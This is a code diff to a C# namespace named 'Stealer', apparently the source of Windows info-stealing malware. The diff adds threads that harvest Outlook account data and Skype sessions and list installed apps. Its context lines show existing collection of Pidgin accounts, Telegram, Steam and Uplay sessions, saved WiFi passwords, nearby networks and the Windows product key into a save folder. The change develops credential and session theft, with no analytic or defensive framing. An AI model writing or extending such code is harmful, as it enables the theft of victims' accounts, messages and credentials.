@@ -50,9 +50,19 @@ namespace Stealer
                     Pidgin.GetAccounts(sSavePath + "\\Messenger\\Pidgin")
                 ));
 
+                // Write outlook accounts
+                Threads.Add(new Thread(() =>
+                    Outlook.GrabOutlook(sSavePath + "\\Messenger\\Outlook")
+                ));
+
                 // Write telegram session
                 Threads.Add(new Thread(() =>
                     Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram")
+                ));
+
+                // Write skype session
+                Threads.Add(new Thread(() =>
+                    Skype.GetSession(sSavePath + "\\Messenger\\Skype")
                 ));
 
                 // Steam & Uplay sessions collection
@@ -120,7 +130,7 @@ namespace Stealer
                 // Saved wifi passwords
                 Threads.Add(new Thread(() =>
                 {
-                    // Fetch WiFi passwords
+                    // Fetch saved WiFi passwords
                     Wifi.SavedNetworks(sSavePath + "\\System");
                     // Fetch all WiFi networks with BSSID
                     Wifi.ScanningNetworks(sSavePath + "\\System");
@@ -131,6 +141,10 @@ namespace Stealer
                     // Write product key
                     File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                         ProductKey.GetWindowsProductKeyFromRegistry())
+                ));
+                // Get installed apps
+                Threads.Add(new Thread(() =>
+                    InstalledApps.WriteAppsList(sSavePath + "\\System")
                 ));
 
                 // Start all threads
